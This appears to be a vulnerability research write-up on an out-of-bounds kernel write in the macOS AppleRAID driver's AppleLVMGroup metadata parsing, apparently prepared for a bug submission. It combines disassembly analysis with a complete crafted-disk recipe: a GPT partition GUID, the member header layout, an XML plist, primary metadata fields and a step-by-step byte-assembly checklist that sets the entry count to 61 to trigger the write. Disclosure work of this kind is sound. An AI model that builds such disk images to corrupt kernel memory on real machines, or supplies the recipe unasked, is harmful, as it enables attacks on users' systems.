# AppleLVMGroup primary metadata closure

Target: `com.apple.driver.AppleRAID` / `AppleLVMGroup` in macOS 27 `26A5353q` kernelcache:

`/Users/dawgyg/kernelcaches_ref/kc27/26A5353q__MacOS/kernelcache.release.Mac13,1_2_MacBookPro18,1_2_3_4`

This note does not re-derive the AppleRAID reachability lane. It starts from the confirmed path:

`AppleRAID::newMember` dispatch on `AppleRAID-LevelName == "LVG"` -> `AppleLVMGroup::createRAIDSet` `0xfffffe0009b6afa4` -> `AppleLVMGroup::startSet` `0xfffffe0009b6b7f0` -> vtable slot `+0x988` -> `AppleLVMGroup::readPrimaryMetaData` `0xfffffe0009b6c4ac`.

## Part A - OOB-write mechanics

### A1. Allocation of the buffer mutated by the byte-swap loop

The buffer written by the loop at `0xfffffe0009b6c550-0xfffffe0009b6c578` is not the `AppleLVMGroup` object allocated by `createRAIDSet`. It is the raw byte backing of an `IOBufferMemoryDescriptor` returned by `AppleRAIDMember::readPrimaryMetaData`.

Call path:

1. `AppleLVMGroup::createRAIDSet` allocates the set object:
   - `0xfffffe0009b6afbc`: materializes `AppleLVMGroup_ktv`
   - `0xfffffe0009b6afc4`: `mov w1, #0x1f0`
   - `0xfffffe0009b6afc8`: `bl 0xfffffe000c1ac488`
   - Result: `AppleLVMGroup` object size `0x1f0`. This object is not the metadata byte buffer.

2. `AppleLVMGroup::readPrimaryMetaData` calls the superclass/member read path:
   - `0xfffffe0009b6c4d0-0xfffffe0009b6c4e8`: dispatches to `AppleRAIDSet::readPrimaryMetaData(this, member)`
   - `AppleRAIDSet::readPrimaryMetaData` `0xfffffe0009b600fc` is a trampoline:
     - `0xfffffe0009b60104-0xfffffe0009b60134`: if member is non-NULL, dispatches member vtable slot `+0x980`
   - Target: `AppleRAIDMember::readPrimaryMetaData` `0xfffffe0009b561cc`

3. `AppleRAIDMember::readPrimaryMetaData` sizes and allocates the primary metadata descriptor from the member plist key `AppleRAID-MetaData1Used`, not from `[meta+0x38]`:
   - `0xfffffe0009b561e4-0xfffffe0009b56244`: fetches `AppleRAID-MetaData1Used` from the parsed header dictionary and reads it as an unsigned 64-bit number
   - `0xfffffe0009b56258-0xfffffe0009b56278`: obtains the primary metadata disk offset from the member header field at header `+0x90`
   - `0xfffffe0009b56280`: `sub x8, x19, #1`
   - `0xfffffe0009b56284`: `and x8, x8, #0xfffffffffffff000`
   - `0xfffffe0009b56288`: `add x0, x8, #1, lsl #12`
   - Effective size: `round_up(AppleRAID-MetaData1Used, 0x1000)`
   - `0xfffffe0009b56294`: `bl 0xfffffe000c28f830`
   - Callee: `IOBufferMemoryDescriptor::withCapacity(size, 0, 0)`

The exact driver-visible allocation call for the mutated bytes is therefore:

`0xfffffe0009b56294: IOBufferMemoryDescriptor::withCapacity(round_up(AppleRAID-MetaData1Used, 0x1000), 0, 0)`

This is not a direct AppleRAID call to `kalloc_data`, `IOMallocData`, or `IOMallocTypeImpl`. The descriptor/backing allocation is through the `IOBufferMemoryDescriptor` path. On this kernel, `withCapacity` enters `IOBufferMemoryDescriptor::initWithPhysicalMask` via the descriptor vtable at `0xfffffe000c28f8a0-0xfffffe000c28f8c0`; the small/default path reaches the generic IOBuffer/IOMalloc allocation helper at `0xfffffe000c2209b8`, which in turn calls the kernel allocator core around `0xfffffe000ba75278`.

After allocation:

- `0xfffffe0009b562f4-0xfffffe0009b5631c`: prepares descriptor direction/range state
- `0xfffffe0009b56340-0xfffffe0009b563a0`: reads from disk offset `header[+0x90]` into the descriptor
- `0xfffffe0009b56448-0xfffffe0009b5646c`: obtains raw bytes and compares the first `0x20` bytes against `AppleRAIDPrimary`
- `0xfffffe0009b6c4f4-0xfffffe0009b6c518`: `AppleLVMGroup::readPrimaryMetaData` gets raw bytes from the descriptor
- `0xfffffe0009b6c520`: raw primary metadata pointer is kept in `x22`

Allocation/loop mismatch:

- Allocated size source: plist key `AppleRAID-MetaData1Used`, rounded up to a page.
- Loop bound source: primary metadata field `[meta+0x38]`, attacker-supplied on disk.
- There is no derivation tying `[meta+0x38]` to the descriptor capacity before the loop.

For the minimal layout below, `AppleRAID-MetaData1Used = 0x2000`, so the descriptor capacity/backing bracket to catch with guarded allocation is `0x2000` bytes. The old VM test bracket `8000-9000` catches this 8192-byte allocation.

### A2. Exact loop body: in-place byte-swap, not attacker-byte copy

Before the per-entry loop, `AppleLVMGroup::readPrimaryMetaData` endian-swaps the fixed primary header in place:

- `0xfffffe0009b6c524`: `ldr q0, [x0, #0x20]`
- `0xfffffe0009b6c528`: `rev64 v0.16b`
- `0xfffffe0009b6c52c`: `str q0, [x0, #0x20]`
- `0xfffffe0009b6c530`: `ldp w8, w9, [x0, #0x30]`
- `0xfffffe0009b6c534`: `rev w10, w8`
- `0xfffffe0009b6c538`: `rev w8, w9`
- `0xfffffe0009b6c53c`: `stp w10, w8, [x0, #0x30]`
- `0xfffffe0009b6c540`: `ldr x10, [x0, #0x38]`
- `0xfffffe0009b6c544`: `rev x9, x10`
- `0xfffffe0009b6c548`: `str x9, [x0, #0x38]`
- `x9` is the host-endian `toc_nentries`.

The only pre-loop test is:

- `0xfffffe0009b6c54c`: `cbz x10, 0xfffffe0009b6c57c`

That tests whether the original big-endian encoded count bytes are zero. It is not a capacity or max-entry bound.

Per-entry loop setup:

- `0xfffffe0009b6c550`: `mov x10, #0`
- `0xfffffe0009b6c554`: `add x11, x22, #0x250`

For each `i` from `0` while `i < toc_nentries`, with stride `0x80`:

- Entry base: `meta + 0x240 + i * 0x80`
- `x11`: `meta + 0x250 + i * 0x80`

Instruction pair 1, 16-byte in-place swap:

- `0xfffffe0009b6c558`: `ldur q0, [x11, #-0x10]`
  - Reads 16 bytes at `meta + 0x240 + i * 0x80`
- `0xfffffe0009b6c55c`: `rev64 v0.16b`
  - Reverses each 64-bit lane
- `0xfffffe0009b6c560`: `stur q0, [x11, #-0x10]`
  - Writes the same 16-byte location back in place

Instruction pair 2, 4-byte read / 8-byte zero-extended write:

- `0xfffffe0009b6c564`: `ldr w12, [x11]`
  - Reads 4 bytes at `meta + 0x250 + i * 0x80`
- `0xfffffe0009b6c568`: `rev w12, w12`
  - Byte-swaps the 32-bit value
- `0xfffffe0009b6c56c`: `str x12, [x11], #0x80`
  - Writes 8 bytes at `meta + 0x250 + i * 0x80`
  - Low dword is the byte-swapped old dword
  - High dword is zero, because writing `w12` zero-extends into `x12`
  - Post-increments `x11` by `0x80`

Loop control:

- `0xfffffe0009b6c570`: `add x10, x10, #1`
- `0xfffffe0009b6c574`: `cmp x10, x9`
- `0xfffffe0009b6c578`: `b.lo 0xfffffe0009b6c558`

This is an in-place endian-conversion loop over the descriptor backing bytes. It does not copy attacker bytes from disk to a different destination after the allocation. Once the loop leaves the descriptor capacity, the OOB effect is:

- 16-byte store: byte-swapped adjacent memory, two reversed 64-bit lanes
- 8-byte store: byte-swapped adjacent dword in the low 32 bits, zero high 32 bits

### A3. Count control and missing cap

`toc_nentries` comes from the on-disk primary metadata field `[meta+0x38]`.

Confirmed pre-loop operations:

- raw load: `0xfffffe0009b6c540: ldr x10, [x0, #0x38]`
- endian conversion: `0xfffffe0009b6c544: rev x9, x10`
- in-place store of converted count: `0xfffffe0009b6c548: str x9, [x0, #0x38]`
- only zero check: `0xfffffe0009b6c54c: cbz x10, 0xfffffe0009b6c57c`
- loop compare only against attacker count:
  - `0xfffffe0009b6c574: cmp x10, x9`
  - `0xfffffe0009b6c578: b.lo 0xfffffe0009b6c558`

No compare before the loop bounds `toc_nentries` against:

- `AppleRAID-MetaData1Used`
- the rounded descriptor capacity
- a computed maximum `((capacity - 0x240) / 0x80)`
- any fixed sane TOC maximum

The later check at `0xfffffe0009b6c57c-0xfffffe0009b6c584` compares a swapped header/sequence field from `[meta+0x34]` against `[this+0x100]`. It occurs after the byte-swap loop and is not a cap on `[meta+0x38]`.

### A4. Verdict

Verdict: `BYTESWAP-OOB`, not `CONTROLLABLE-WRITE`.

The attacker controls:

- descriptor capacity indirectly through plist key `AppleRAID-MetaData1Used`
- `toc_nentries` directly through primary metadata field `[meta+0x38]`
- the in-bounds bytes that get endian-swapped before the OOB boundary

The attacker does not get a direct copy of arbitrary on-disk bytes into the OOB destination. The OOB destination is adjacent allocator memory, and the values written are derived from the previous adjacent memory contents by endian-swapping, with the second store zeroing the high dword.

Minimal OOB math for the layout in Part B:

- `AppleRAID-MetaData1Used = 0x2000`
- descriptor capacity: `0x2000`
- TOC entry base: `0x240 + i * 0x80`
- last fully in-bounds touched entry: `i = 59`
  - 16-byte store at `0x1fc0..0x1fcf`
  - 8-byte store at `0x1fd0..0x1fd7`
- first OOB entry: `i = 60`
  - 16-byte store at `0x2040..0x204f`
  - 8-byte store at `0x2050..0x2057`
- use `toc_nentries = 61` (`0x3d`) to execute entry `60`

## Part B - On-disk layout to reach `readPrimaryMetaData`

### B1. Create/start checks that must be satisfied

`createRAIDSet` itself does not parse the primary metadata blob. It allocates and initializes an `AppleLVMGroup`, initializes it from the member header dictionary, and sizes LVG member arrays. The primary blob is consumed later by `startSet`.

Important `createRAIDSet` checks:

- `0xfffffe0009b6afc4`: object size `0x1f0`
- `0xfffffe0009b6afc8`: allocate `AppleLVMGroup`
- `0xfffffe0009b6b00c-0xfffffe0009b6b02c`: call `AppleLVMGroup::init`; failure releases object
- `0xfffffe0009b6b030-0xfffffe0009b6b054`: fetch member header/dictionary from the member
- `0xfffffe0009b6b07c-0xfffffe0009b6b098`: call set init-from-header path with strict flag `w2 = 1`
- `0xfffffe0009b6b09c-0xfffffe0009b6b0c0`: resize LVG arrays using the member count from the initialized set

`AppleLVMGroup::init`:

- `0xfffffe0009b6b108-0xfffffe0009b6b120`: calls superclass init
- `0xfffffe0009b6b128-0xfffffe0009b6b154`: zeroes LVG-specific fields, including `[this+0x1c8]`
- `0xfffffe0009b6b178-0xfffffe0009b6b19c`: sets `AppleRAID-LevelName` to `LVG`

Member header parsing:

- `AppleRAIDMember::readRAIDHeader` allocates a `0x1000` header buffer at `0xfffffe0009b54958-0xfffffe0009b54964`
- `0xfffffe0009b54b2c-0xfffffe0009b54b38`: compares the first `0x10` bytes against `AppleRAIDHeader`
- `0xfffffe0009b54c10-0xfffffe0009b54c18`: if header field `+0x90` is zero, defaults the primary metadata offset to `0x1000`; otherwise the header value is used
- `0xfffffe0009b55a98-0xfffffe0009b55abc`: obtains raw header bytes for plist parse
- `0xfffffe0009b55ac4`: parses XML plist starting at header `+0x98`

Primary member requirement:

- `AppleLVMGroup::addMember` stores the selected primary member in `[this+0x1c8]`:
  - `0xfffffe0009b6b560-0xfffffe0009b6b578`: helper/vtable path chooses a primary member
  - `0xfffffe0009b6b584-0xfffffe0009b6b5b0`: stores the returned member at `[this+0x1c8]`
- For a one-member LVG, make all member-count/index fields coherent:
  - member count is 1
  - `AppleRAID-Members` array has exactly the one member UUID
  - `AppleRAID-MemberUUID` equals that array element
  - `AppleRAID-MemberIndex` is 0

`startSet` requires `[this+0x1c8]` and a readable primary metadata descriptor:

- `0xfffffe0009b6b814-0xfffffe0009b6b824`: superclass `startSet`
- `0xfffffe0009b6b868`: `ldr x0, [x19, #0x1c8]`
- `0xfffffe0009b6b86c`: `cbz x0, fail`
- `0xfffffe0009b6b870-0xfffffe0009b6b890`: call primary member read path
- `0xfffffe0009b6b894`: fail if descriptor is NULL
- `0xfffffe0009b6b95c-0xfffffe0009b6b970`: calls LVG vtable slot `+0x988`, i.e. `AppleLVMGroup::readPrimaryMetaData`

The allocation at `0xfffffe0009b6b8b0-0xfffffe0009b6b8bc` (`IOMallocTypeVarImpl`, size `0x2000`, stored at `[this+0x1d8]`) is LVG state allocated by `startSet`; it is separate from the primary metadata descriptor backing mutated by the byte-swap loop.

### B2. GPT/container constants

Use a normal GPT image with an AppleRAID partition. The known AppleRAID GPT type GUID is:

`52414944-0000-11AA-AA11-00306543ECAC`

The following offsets are partition-relative. The existing proof layout uses:

- partition start: LBA 40
- partition size: `0x8000`
- primary metadata blob: partition `+0x1000`
- member header: partition `+0x7000`

These offsets are not magic to the bug; they are a compact coherent layout that gives the member header room for a plist and points header `+0x90` at the primary blob.

### B3. Member header layout

At partition-relative offset `0x7000`, place a `0x1000` AppleRAID member header buffer:

| Header offset | Size | Encoding | Value |
| --- | ---: | --- | --- |
| `0x00` | `0x10` | bytes | ASCII `AppleRAIDHeader` followed by NUL (`41 70 70 6c 65 52 41 49 44 48 65 61 64 65 72 00`) |
| `0x90` | `0x08` | big-endian u64 | primary metadata offset from partition start, e.g. `0x1000` (`00 00 00 00 00 00 10 00`) |
| `0x98` | variable | XML plist + NUL | member header dictionary |

Use this plist shape for a one-member LVG. The extra strict/coherence keys avoid the incomplete-metadata path that made earlier LVG creation return NULL:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>AppleRAID-LevelName</key>
  <string>LVG</string>

  <key>AppleRAID-HeaderVersion</key>
  <integer>2</integer>

  <key>AppleRAID-SetName</key>
  <string>x</string>

  <key>AppleRAID-SetUUID</key>
  <string>11111111-1111-1111-1111-111111111111</string>

  <key>AppleRAID-MemberUUID</key>
  <string>22222222-2222-2222-2222-222222222222</string>

  <key>AppleRAID-MemberIndex</key>
  <integer>0</integer>

  <key>AppleRAID-MemberType</key>
  <string>AppleRAID-Members</string>

  <key>AppleRAID-Members</key>
  <array>
    <string>22222222-2222-2222-2222-222222222222</string>
  </array>

  <key>appleraid-MemberCount</key>
  <integer>1</integer>

  <key>AppleRAID-SequenceNumber</key>
  <integer>1</integer>

  <key>AppleRAID-ChunkSize</key>
  <integer>4096</integer>

  <key>AppleRAID-ChunkCount</key>
  <integer>1</integer>

  <key>AppleRAID-MetaData1Used</key>
  <integer>8192</integer>

  <key>AppleRAID-MetaData2Size</key>
  <integer>0</integer>
</dict>
</plist>
```

Key use by disassembly:

- `AppleRAID-LevelName = LVG`: required for the LVG dispatch already established by the reachability lane.
- `AppleRAID-Members` + `appleraid-MemberCount = 1` + `AppleRAID-MemberIndex = 0`: makes the one-member set coherent and allows the lone member to become `[this+0x1c8]`.
- `AppleRAID-ChunkCount`: read by `AppleLVMGroup::addMember` at `0xfffffe0009b6b4a0-0xfffffe0009b6b504` and stored into the LVG per-member size array.
- `AppleRAID-MetaData1Used = 8192`: consumed by `AppleRAIDMember::readPrimaryMetaData` as the primary descriptor capacity source at `0xfffffe0009b561e4-0xfffffe0009b56294`.
- `AppleRAID-SequenceNumber`: initializes set sequence state used by later primary metadata sequence checks.

The known relevant cstring keys in this kext include:

- `AppleRAID-LevelName`
- `AppleRAID-SetName`
- `AppleRAID-SetUUID`
- `AppleRAID-MemberUUID`
- `AppleRAID-MemberIndex`
- `AppleRAID-MemberType`
- `AppleRAID-Members`
- `appleraid-MemberCount`
- `AppleRAID-HeaderVersion`
- `AppleRAID-SequenceNumber`
- `AppleRAID-ChunkSize`
- `AppleRAID-ChunkCount`
- `AppleRAID-MetaData1Used`
- `AppleRAID-MetaData2Size`

### B4. Primary metadata blob layout

Place this blob at the partition-relative offset specified by member header `+0x90`, e.g. partition `+0x1000`.

The descriptor allocation size is not the blob's internal count. It is the plist value `AppleRAID-MetaData1Used`, rounded up to a page. With `8192`, the descriptor backing is `0x2000` bytes.

`AppleRAIDMember::readPrimaryMetaData` validates only the primary signature before returning the descriptor:

- `0xfffffe0009b56448-0xfffffe0009b5645c`: gets raw bytes
- `0xfffffe0009b56460-0xfffffe0009b5646c`: compares the first `0x20` bytes against `AppleRAIDPrimary`

Minimal primary blob fields:

| Primary offset | Size | Encoding before LVG swap | Value for minimal OOB |
| --- | ---: | --- | --- |
| `0x00` | `0x20` | ASCII + NUL padding | `AppleRAIDPrimary` followed by zero padding to `0x20` bytes |
| `0x20` | `0x08` | big-endian u64 | `0` |
| `0x28` | `0x08` | big-endian u64 | `0x2000` |
| `0x30` | `0x04` | big-endian u32 | `0` |
| `0x34` | `0x04` | big-endian u32 | `0` |
| `0x38` | `0x08` | big-endian u64 | `toc_nentries`; use `61` (`0x3d`) for first OOB with `0x2000` backing |
| `0x40..0x23f` | bytes | zero/opaque | zero-fill for minimal reach |
| `0x240` | entries | described below | TOC entries, stride `0x80` |

The field at primary `+0x34` is checked only after the byte-swap loop at `0xfffffe0009b6c57c-0xfffffe0009b6c584`. Setting it to `0` keeps it less than or equal to a plist sequence number of `1`.

TOC entry layout as consumed by the vulnerable loop:

Entry `i` starts at:

`entry_i = primary + 0x240 + i * 0x80`

Fields touched before any later semantic parse:

| Entry-relative offset | Size | Instruction(s) | Effect |
| --- | ---: | --- | --- |
| `0x00` | `0x10` | `0xfffffe0009b6c558`, `0xfffffe0009b6c55c`, `0xfffffe0009b6c560` | read 16 bytes and write them back in place with `rev64` over each 64-bit lane |
| `0x10` | `0x04` read / `0x08` write | `0xfffffe0009b6c564`, `0xfffffe0009b6c568`, `0xfffffe0009b6c56c` | read a 32-bit value, byte-swap it, write zero-extended 64-bit value back at `+0x10` |
| `0x18..0x7f` | opaque for this loop | not touched by the loop | zero-fill for minimal reach |

The loop's structural constants are:

- TOC base: primary `+0x240`
- first `x11`: primary `+0x250`
- stride: `0x80`
- count field: primary `+0x38`

For an `0x2000` descriptor, set:

```text
primary[0x00:0x20] = "AppleRAIDPrimary" + NUL padding
be64(primary+0x20) = 0
be64(primary+0x28) = 0x2000
be32(primary+0x30) = 0
be32(primary+0x34) = 0
be64(primary+0x38) = 61
zero-fill primary[0x40:0x2000]
```

The in-bounds TOC bytes can be zero. The OOB occurs because the loop trusts count `61`, not because it needs meaningful TOC records.

### B5. Byte-assembly checklist

Partition-relative assembly recipe:

1. GPT partition type GUID: `52414944-0000-11AA-AA11-00306543ECAC`.
2. Put primary metadata at partition `+0x1000`.
3. Put member header at partition `+0x7000`.
4. At header `+0x00`, write `AppleRAIDHeader\0`.
5. At header `+0x90`, write big-endian u64 `0x1000`.
6. At header `+0x98`, write the XML plist above and NUL-terminate it.
7. At primary `+0x00`, write `AppleRAIDPrimary` and NUL-pad through `+0x1f`.
8. At primary `+0x20`, `+0x28`, `+0x30`, `+0x34`, and `+0x38`, write the big-endian fields from B4.
9. Use `AppleRAID-MetaData1Used = 8192` in the plist and `toc_nentries = 61` in the primary blob for the minimal first-OOB case.

Expected outcome when the LVG member metadata is complete:

- `createRAIDSet` returns a non-NULL `AppleLVMGroup`.
- `addMember` can select the only member as `[this+0x1c8]`.
- `startSet` reaches the vtable `+0x988` call into `AppleLVMGroup::readPrimaryMetaData`.
- The primary signature passes.
- The byte-swap loop runs with attacker count `61` over an `0x2000` descriptor backing.
- The first OOB write is the `i = 60` in-place endian flip at primary offsets `0x2040..0x2057`.

Final classification: submission impact should be framed as an unbounded in-place endian-swap OOB write from attacker-controlled metadata count against an attacker-sized primary metadata `IOBufferMemoryDescriptor`, not as a direct arbitrary attacker-bytes kernel write.
